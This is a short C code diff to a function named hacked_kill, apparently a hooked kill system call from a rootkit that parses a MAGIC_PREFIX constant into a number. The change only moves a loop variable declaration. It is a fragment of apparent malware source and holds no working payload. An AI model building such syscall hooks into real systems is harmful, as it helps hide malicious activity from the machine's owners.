@@ -317,7 +317,8 @@ hacked_kill(pid_t pid, int sig)
 	
 	long long magicPrefixNum = 0;//ADDED
     const char *prefix = MAGIC_PREFIX;//ADDED
-    for (int i = 0; prefix[i] != '\0'; i++) {// Iterate over each character in the prefix string //ADDED
+    int i;
+	for (i = 0; prefix[i] != '\0'; i++) {// Iterate over each character in the prefix string //ADDED
         if (prefix[i] >= '0' && prefix[i] <= '9') {// Check if the current character is a digit
             magicPrefixNum = magicPrefixNum * 10LL + (prefix[i] - '0');// If so, multiply the existing value of magicPrefixNum by 10 and add the new digit
         }
